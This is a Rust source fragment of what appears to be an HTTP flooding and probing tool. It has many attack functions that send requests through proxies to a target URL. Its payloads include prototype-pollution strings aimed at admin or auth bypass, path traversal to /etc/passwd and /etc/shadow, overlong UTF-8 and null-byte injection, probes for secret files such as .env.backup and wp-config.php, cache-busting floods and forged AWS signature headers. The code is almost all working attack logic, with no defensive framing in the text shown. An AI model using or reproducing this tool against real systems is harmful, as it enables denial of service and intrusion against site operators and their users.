    const PATHS: &[&str] = &["/v1", "/v2", "/v3", "/api/v1", "/api/v2", "/api/v3", "/v1.0", "/v2.0", "/v1.1", "/api/v1/health", "/api/v2/health", "/v1/users", "/v2/users", "/api/v1.0", "/api/v2.0"];
    let path: &str = { let mut rng = rand::rng(); PATHS[rng.random_range(0..PATHS.len())] };
    let target = format!("{}{}", url.trim_end_matches('/'), path);
    if verbose { println!("[VERBOSE] fetch_apiversionflood: GET {} (proxy #{})", target, proxy_idx); }
    let resp = send_with_retry(c.get(&target).header("Accept", "application/json").header("User-Agent", "Mozilla/5.0 (compatible; ApiVersionFlood/1.0)"), max_retries, "fetch_apiversionflood").await?;
    let status = resp.status().as_u16();
    update_session_from_headers(proxy_idx, &sessions, resp.headers());
    let bytes = resp.bytes().await?.len();
    Ok((bytes, status))
}

/// PrototypeFlood: prototype pollution in query params
pub(crate) async fn fetch_prototypeflood(c: Client, url: String, delay: u64, proxy_idx: usize, sessions: Arc<Vec<std::sync::Mutex<String>>>, verbose: bool, max_retries: usize) -> Result<(usize, u16), FetchError> {
    if delay > 0 { tokio::time::sleep(Duration::from_millis(delay)).await; }
    let qs = "__proto__[polluted]=true&constructor[prototype][admin]=true&__proto__[isAdmin]=true&__proto__[auth]=bypass&constructor.prototype.blocked=false";
    let target = format!("{}?{}&_={}", url.trim_end_matches('?'), qs, rand::random::<u64>());
    if verbose { println!("[VERBOSE] fetch_prototypeflood: GET {} (proxy #{})", url, proxy_idx); }
    let resp = send_with_retry(c.get(&target).header("User-Agent", "Mozilla/5.0 (compatible; PrototypeFlood/1.0)"), max_retries, "fetch_prototypeflood").await?;
    let status = resp.status().as_u16();
    update_session_from_headers(proxy_idx, &sessions, resp.headers());
    let bytes = resp.bytes().await?.len();
    Ok((bytes, status))
}

/// JsonpFlood: JSONP callback parameter probe
pub(crate) async fn fetch_jsonpflood(c: Client, url: String, delay: u64, proxy_idx: usize, sessions: Arc<Vec<std::sync::Mutex<String>>>, verbose: bool, max_retries: usize) -> Result<(usize, u16), FetchError> {
    if delay > 0 { tokio::time::sleep(Duration::from_millis(delay)).await; }
    const PATHS: &[&str] = &["/jsonp?callback=test", "/api/jsonp?callback=test", "/json?callback=test", "/api?callback=test&format=json", "/callback?callback=test", "/data?callback=test"];
    let path: &str = { let mut rng = rand::rng(); PATHS[rng.random_range(0..PATHS.len())] };
    let target = format!("{}{}", url.trim_end_matches('/'), path);
    if verbose { println!("[VERBOSE] fetch_jsonpflood: GET {} (proxy #{})", target, proxy_idx); }
    let resp = send_with_retry(c.get(&target).header("User-Agent", "Mozilla/5.0 (compatible; JsonpFlood/1.0)"), max_retries, "fetch_jsonpflood").await?;
    let status = resp.status().as_u16();
    update_session_from_headers(proxy_idx, &sessions, resp.headers());
    let bytes = resp.bytes().await?.len();
    Ok((bytes, status))
}

/// ArrayFlood: array notation in params
pub(crate) async fn fetch_arrayflood(c: Client, url: String, delay: u64, proxy_idx: usize, sessions: Arc<Vec<std::sync::Mutex<String>>>, verbose: bool, max_retries: usize) -> Result<(usize, u16), FetchError> {
    if delay > 0 { tokio::time::sleep(Duration::from_millis(delay)).await; }
    let qs: String = { (0..30).flat_map(|i| (0..3).map(move |_| format!("arr{}[]={:08x}", i, rand::random::<u32>()))).collect::<Vec<_>>().join("&") };
    let target = format!("{}?{}", url.trim_end_matches('?'), qs);
    if verbose { println!("[VERBOSE] fetch_arrayflood: GET {} (proxy #{}) — 90 array params", url, proxy_idx); }
    let resp = send_with_retry(c.get(&target).header("User-Agent", "Mozilla/5.0 (compatible; ArrayFlood/1.0)"), max_retries, "fetch_arrayflood").await?;
    let status = resp.status().as_u16();
    update_session_from_headers(proxy_idx, &sessions, resp.headers());
    let bytes = resp.bytes().await?.len();
    Ok((bytes, status))
}

/// SitemapFlood: sitemap/robots/feed probing
pub(crate) async fn fetch_sitemapflood(c: Client, url: String, delay: u64, proxy_idx: usize, sessions: Arc<Vec<std::sync::Mutex<String>>>, verbose: bool, max_retries: usize) -> Result<(usize, u16), FetchError> {
    if delay > 0 { tokio::time::sleep(Duration::from_millis(delay)).await; }
    const PATHS: &[&str] = &["/sitemap.xml", "/sitemap_index.xml", "/robots.txt", "/feed.xml", "/rss", "/atom.xml", "/feed/", "/rss.xml", "/sitemap", "/sitemap.xml.gz"];
    let path: &str = { let mut rng = rand::rng(); PATHS[rng.random_range(0..PATHS.len())] };
    let target = format!("{}{}", url.trim_end_matches('/'), path);
    if verbose { println!("[VERBOSE] fetch_sitemapflood: GET {} (proxy #{})", target, proxy_idx); }
    let resp = send_with_retry(c.get(&target).header("User-Agent", "Mozilla/5.0 (compatible; SitemapFlood/1.0)"), max_retries, "fetch_sitemapflood").await?;
    let status = resp.status().as_u16();
    update_session_from_headers(proxy_idx, &sessions, resp.headers());
    let bytes = resp.bytes().await?.len();
    Ok((bytes, status))
}

/// UnicodeFlood: overlong UTF-8, null bytes, BOM in URL
pub(crate) async fn fetch_unicodeflood(c: Client, url: String, delay: u64, proxy_idx: usize, sessions: Arc<Vec<std::sync::Mutex<String>>>, verbose: bool, max_retries: usize) -> Result<(usize, u16), FetchError> {
    if delay > 0 { tokio::time::sleep(Duration::from_millis(delay)).await; }
    let qs: String = { format!("a=%00b%00c&d=%C0%AE%E0%80%AE&e=%E0%80%AF%E0%80%AE&f=%F0%80%80%AE&g=%00&h=%C0%80&i=%E0%80%80&j=%F0%80%80%80&k=%F8%80%80%80%80&l=%FC%80%80%80%80%80&m={:08x}", rand::random::<u32>()) };
    let target = format!("{}/%00/null/../unicode/%C0%AE/test/?{}", url.trim_end_matches('/'), qs);
    if verbose { println!("[VERBOSE] fetch_unicodeflood: GET {} (proxy #{}) — overlong UTF-8/null bytes", url, proxy_idx); }
    let resp = send_with_retry(c.get(&target).header("User-Agent", "Mozilla/5.0 (compatible; UnicodeFlood/1.0)"), max_retries, "fetch_unicodeflood").await?;
    let status = resp.status().as_u16();
    update_session_from_headers(proxy_idx, &sessions, resp.headers());
    let bytes = resp.bytes().await?.len();
    Ok((bytes, status))
}

/// ParamDuplicate: duplicate param names
pub(crate) async fn fetch_paramduplicate(c: Client, url: String, delay: u64, proxy_idx: usize, sessions: Arc<Vec<std::sync::Mutex<String>>>, verbose: bool, max_retries: usize) -> Result<(usize, u16), FetchError> {
    if delay > 0 { tokio::time::sleep(Duration::from_millis(delay)).await; }
    let qs: String = { (0..60).map(|i| format!("key=value{:08x}_{}", rand::random::<u32>(), i)).collect::<Vec<_>>().join("&") };
    let target = format!("{}?{}", url.trim_end_matches('?'), qs);
    if verbose { println!("[VERBOSE] fetch_paramduplicate: GET {} (proxy #{}) — 60 duplicate 'key' params", url, proxy_idx); }
    let resp = send_with_retry(c.get(&target).header("User-Agent", "Mozilla/5.0 (compatible; ParamDuplicate/1.0)"), max_retries, "fetch_paramduplicate").await?;
    let status = resp.status().as_u16();
    update_session_from_headers(proxy_idx, &sessions, resp.headers());
    let bytes = resp.bytes().await?.len();
    Ok((bytes, status))
}

/// Cache Buster Flood — random ?cb=HEX on each request forces CDN/origin cache miss
pub(crate) async fn fetch_cachebusterflood(c: Client, url: String, delay: u64, proxy_idx: usize, sessions: Arc<Vec<std::sync::Mutex<String>>>, verbose: bool, max_retries: usize) -> Result<(usize, u16), FetchError> {
    if delay > 0 { tokio::time::sleep(Duration::from_millis(delay)).await; }
    let cb = format!("{:08x}", rand::random::<u32>());
    let target = format!("{}?cb={}", url.trim_end_matches('?').trim_end_matches('&'), cb);
    if verbose { println!("[VERBOSE] Cache Buster: {}", target); }
    let resp = send_with_retry(c.get(&target), max_retries, "fetch_cachebusterflood").await?;
    let status = resp.status().as_u16();
    update_session_from_headers(proxy_idx, &sessions, resp.headers());
    let bytes = resp.bytes().await?.len();
    Ok((bytes, status))
}

/// File Enum Flood — probes common file names to generate 404 resource overhead
pub(crate) async fn fetch_fileenumflood(c: Client, url: String, delay: u64, proxy_idx: usize, sessions: Arc<Vec<std::sync::Mutex<String>>>, verbose: bool, max_retries: usize) -> Result<(usize, u16), FetchError> {
    if delay > 0 { tokio::time::sleep(Duration::from_millis(delay)).await; }
    const FILE_PATHS: &[&str] = &[
        "/backup.sql", "/config.php", "/composer.lock", "/package.json", "/composer.json",
        "/Gemfile", "/Procfile", "/Dockerfile", "/debug.log", "/error_log",
        "/wp-config.php", "/config.json", "/Podfile", "/Makefile", "/.htaccess",
        "/.env.backup", "/.gitignore", "/Procfile", "/robots.txt.backup",
    ];
    let path = FILE_PATHS[rand::random::<u32>() as usize % FILE_PATHS.len()];
    let base = url.trim_end_matches('/');
    let target = format!("{}{}", base, path);
    if verbose { println!("[VERBOSE] File Enum: {}", target); }
    let resp = send_with_retry(c.get(&target), max_retries, "fetch_fileenumflood").await?;
    let status = resp.status().as_u16();
    update_session_from_headers(proxy_idx, &sessions, resp.headers());
    let bytes = resp.bytes().await?.len();
    Ok((bytes, status))
}

/// SOAP Flood — POST with SOAP envelope XML and SOAPAction header
pub(crate) async fn fetch_soapflood(c: Client, url: String, delay: u64, proxy_idx: usize, sessions: Arc<Vec<std::sync::Mutex<String>>>, verbose: bool, max_retries: usize) -> Result<(usize, u16), FetchError> {
    if delay > 0 { tokio::time::sleep(Duration::from_millis(delay)).await; }
    let actions = ["GetStockPrice", "GetQuote", "LookupUser", "ValidateAddress", "ProcessPayment"];
    let action = actions[rand::random::<u32>() as usize % actions.len()];
    let soap_body = format!(
        r#"<?xml version="1.0" encoding="UTF-8"?><soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/"><soap:Body><{} xmlns="http://example.com/"><request><id>{:08x}</id></request></{}></soap:Body></soap:Envelope>"#,
        action, rand::random::<u32>(), action
    );
    if verbose { println!("[VERBOSE] SOAP Flood: {} action={}", url, action); }
    let resp = send_with_retry(
        c.post(&url)
            .header("Content-Type", "text/xml; charset=utf-8")
            .header("SOAPAction", format!("\"http://example.com/{}\"", action))
            .body(soap_body),
        max_retries, "fetch_soapflood"
    ).await?;
    let status = resp.status().as_u16();
    update_session_from_headers(proxy_idx, &sessions, resp.headers());
    let bytes = resp.bytes().await?.len();
    Ok((bytes, status))
}

/// Signed Header Flood — AWS-style Authorization headers forcing signature computation
pub(crate) async fn fetch_signedheaderflood(c: Client, url: String, delay: u64, proxy_idx: usize, sessions: Arc<Vec<std::sync::Mutex<String>>>, verbose: bool, max_retries: usize) -> Result<(usize, u16), FetchError> {
    if delay > 0 { tokio::time::sleep(Duration::from_millis(delay)).await; }
    let cred = format!("AKIA{:08x}", rand::random::<u32>());
    let sig = format!("{:064x}", rand::random::<u128>());
    let date = format!("2026{:02}{:02}T{:02}{:02}{:02}Z", rand::random::<u8>() % 12 + 1, rand::random::<u8>() % 28 + 1, rand::random::<u8>() % 24, rand::random::<u8>() % 60, rand::random::<u8>() % 60);
    let auth = format!("AWS4-HMAC-SHA256 Credential={}/20260726/us-east-1/s3/aws4_request, SignedHeaders=host;x-amz-date, Signature={}", cred, sig);
    if verbose { println!("[VERBOSE] Signed Header Flood"); }
    let resp = send_with_retry(
        c.get(&url)
            .header("Authorization", &auth)
            .header("X-Amz-Date", &date)
            .header("X-Amz-Security-Token", &format!("{:x}", rand::random::<u64>())),
        max_retries, "fetch_signedheaderflood"
    ).await?;
    let status = resp.status().as_u16();
    update_session_from_headers(proxy_idx, &sessions, resp.headers());
    let bytes = resp.bytes().await?.len();
    Ok((bytes, status))
}

/// UTF-8 BOM Flood — POST body with BOM prefix (some parsers mis-handle this)
pub(crate) async fn fetch_utf8bomflood(c: Client, url: String, delay: u64, proxy_idx: usize, sessions: Arc<Vec<std::sync::Mutex<String>>>, verbose: bool, max_retries: usize) -> Result<(usize, u16), FetchError> {
    if delay > 0 { tokio::time::sleep(Duration::from_millis(delay)).await; }
    // UTF-8 BOM: 0xEF,0xBB,0xBF
    let body = format!("\u{feff}{{ \"key\": \"value\", \"nested\": {{ \"data\": \"{:08x}\" }} }}", rand::random::<u32>());
    if verbose { println!("[VERBOSE] UTF-8 BOM Flood"); }
    let resp = send_with_retry(
        c.post(&url)
            .header("Content-Type", "application/json; charset=utf-8")
            .body(body),
        max_retries, "fetch_utf8bomflood"
    ).await?;
    let status = resp.status().as_u16();
    update_session_from_headers(proxy_idx, &sessions, resp.headers());
    let bytes = resp.bytes().await?.len();
    Ok((bytes, status))
}

/// Double Dot Flood — path traversal sequences for path normalization overhead
pub(crate) async fn fetch_doubledotflood(c: Client, url: String, delay: u64, proxy_idx: usize, sessions: Arc<Vec<std::sync::Mutex<String>>>, verbose: bool, max_retries: usize) -> Result<(usize, u16), FetchError> {
    if delay > 0 { tokio::time::sleep(Duration::from_millis(delay)).await; }
    const TRAVERSALS: &[&str] = &[
        "/..;/..;/..;/etc/passwd",
        "/..%5c..%5c..%5c..%5cwindows/win.ini",
        "/../../../etc/passwd",
        "/....//....//....//etc/shadow",
        "/%2e%2e/%2e%2e/%2e%2e/etc/hosts",
        "/..\\..\\..\\..\\boot.ini",
        "/;foo/../bar/../baz/",
        "/../../../../../../var/log/auth.log",
    ];
    let trav = TRAVERSALS[rand::random::<u32>() as usize % TRAVERSALS.len()];
    let base = url.trim_end_matches('/');
    let target = format!("{}{}", base, trav);
    if verbose { println!("[VERBOSE] Double Dot: {}", target); }
    let resp = send_with_retry(c.get(&target), max_retries, "fetch_doubledotflood").await?;
    let status = resp.status().as_u16();
    update_session_from_headers(proxy_idx, &sessions, resp.headers());
    let bytes = resp.bytes().await?.len();
    Ok((bytes, status))
}

/// Empty Param Flood — naked/empty query params (?&&key&&&=)
pub(crate) async fn fetch_emptyparamflood(c: Client, url: String, delay: u64, proxy_idx: usize, sessions: Arc<Vec<std::sync::Mutex<String>>>, verbose: bool, max_retries: usize) -> Result<(usize, u16), FetchError> {
    if delay > 0 { tokio::time::sleep(Duration::from_millis(delay)).await; }
    const PARAM_PATTERNS: &[&str] = &[
        "?&&&key&&key2&&&key3=value&",
        "?&&&&&&=",
        "?a&b&c&d&e&f&g&h",
        "?=value&=another&=third",
        "?&a&b&c&&d&&e=&f=",
        "?key&=&&&=&==&",
        "?_____&&&&&&_______",
    ];
    let pat = PARAM_PATTERNS[rand::random::<u32>() as usize % PARAM_PATTERNS.len()];
    // Clean the URL — remove any existing query
    let base = url.split('?').next().unwrap_or(&url);
    let target = format!("{}{}", base.trim_end_matches('/'), pat);
    if verbose { println!("[VERBOSE] Empty Param: {}", target); }
    let resp = send_with_retry(c.get(&target), max_retries, "fetch_emptyparamflood").await?;
    let status = resp.status().as_u16();
    update_session_from_headers(proxy_idx, &sessions, resp.headers());
    let bytes = resp.bytes().await?.len();
    Ok((bytes, status))
}

/// Header Order Flood — same headers in varying order (header normalization overhead)
pub(crate) async fn fetch_headerorderflood(c: Client, url: String, delay: u64, proxy_idx: usize, sessions: Arc<Vec<std::sync::Mutex<String>>>, verbose: bool, max_retries: usize) -> Result<(usize, u16), FetchError> {
    if delay > 0 { tokio::time::sleep(Duration::from_millis(delay)).await; }
    let user_agents = [
        "Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0",
        "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    ];
    let ua = user_agents[rand::random::<u32>() as usize % user_agents.len()];
    let mut req = c.get(&url).header("User-Agent", ua);
    // Headers in scrambled order
    let order = rand::random::<u32>() as usize % 4;
    match order {
        0 => {
            req = req.header("Accept", "text/html,application/xhtml+xml")
                .header("Accept-Language", "en-US,en;q=0.5")
                .header("Accept-Encoding", "gzip, deflate, br")
                .header("Cache-Control", "no-cache")
                .header("DNT", "1")
                .header("Connection", "keep-alive");
        }
        1 => {
            req = req.header("Connection", "keep-alive")
                .header("DNT", "1")
                .header("Cache-Control", "no-cache")
                .header("Accept-Encoding", "gzip, deflate, br")
                .header("Accept-Language", "en-US,en;q=0.5")
                .header("Accept", "text/html,application/xhtml+xml");
        }
        2 => {
            req = req.header("Accept-Encoding", "gzip, deflate, br")
                .header("Accept", "text/html,application/xhtml+xml")
                .header("Connection", "keep-alive")
                .header("DNT", "1")
                .header("Cache-Control", "no-cache")
                .header("Accept-Language", "en-US,en;q=0.5");
        }
        _ => {
            req = req.header("DNT", "1")
                .header("Connection", "keep-alive")
                .header("Accept-Language", "en-US,en;q=0.5")
                .header("Accept-Encoding", "gzip, deflate, br")
                .header("Cache-Control", "no-cache")
                .header("Accept", "text/html,application/xhtml+xml");
        }
    }
    if verbose { println!("[VERBOSE] Header Order Flood (order={})", order); }
    let resp = send_with_retry(req, max_retries, "fetch_headerorderflood").await?;
    let status = resp.status().as_u16();
    update_session_from_headers(proxy_idx, &sessions, resp.headers());
    let bytes = resp.bytes().await?.len();
    Ok((bytes, status))
}

/// Cross-Domain Flood — probes cross-domain policy files (e.g. crossdomain.xml)
pub(crate) async fn fetch_crossdomainflood(c: Client, url: String, delay: u64, proxy_idx: usize, sessions: Arc<Vec<std::sync::Mutex<String>>>, verbose: bool, max_retries: usize) -> Result<(usize, u16), FetchError> {
    if delay > 0 { tokio::time::sleep(Duration::from_millis(delay)).await; }
    const CROSS_PATHS: &[&str] = &[
        "/crossdomain.xml", "/clientaccesspolicy.xml", "/domain.xml",
        "/security.xml", "/access-policy.xml", "/policy.xml",
        "/.well-known/assetlinks.json", "/.well-known/apple-app-site-association",
    ];
    let path = CROSS_PATHS[rand::random::<u32>() as usize % CROSS_PATHS.len()];
    let base = url.trim_end_matches('/');
    let target = format!("{}{}", base, path);
    if verbose { println!("[VERBOSE] Cross-Domain: {}", target); }
    let resp = send_with_retry(c.get(&target), max_retries, "fetch_crossdomainflood").await?;
    let status = resp.status().as_u16();
    update_session_from_headers(proxy_idx, &sessions, resp.headers());
    let bytes = resp.bytes().await?.len();
    Ok((bytes, status))
}

/// Referer Flood — varying Referer headers to trigger referer-based processing
pub(crate) async fn fetch_refererflood(c: Client, url: String, delay: u64, proxy_idx: usize, sessions: Arc<Vec<std::sync::Mutex<String>>>, verbose: bool, max_retries: usize) -> Result<(usize, u16), FetchError> {
    if delay > 0 { tokio::time::sleep(Duration::from_millis(delay)).await; }
    let referers = [
        "https://www.google.com/search?q=test",
        "https://github.com/rust-lang/rust",
        "https://news.ycombinator.com/",
        "https://www.reddit.com/r/rust/",
        "https://stackoverflow.com/questions/rust",
        "https://crates.io/crates/simulate-load",
        "https://en.wikipedia.org/wiki/Hypertext_Transfer_Protocol",
        "https://twitter.com/rustlang",
    ];
    let referer = referers[rand::random::<u32>() as usize % referers.len()];
    if verbose { println!("[VERBOSE] Referer: {} <- {}", url, referer); }
    let resp = send_with_retry(
        c.get(&url).header("Referer", referer),
        max_retries, "fetch_refererflood"
    ).await?;
    let status = resp.status().as_u16();
    update_session_from_headers(proxy_idx, &sessions, resp.headers());
    let bytes = resp.bytes().await?.len();
    Ok((bytes, status))
}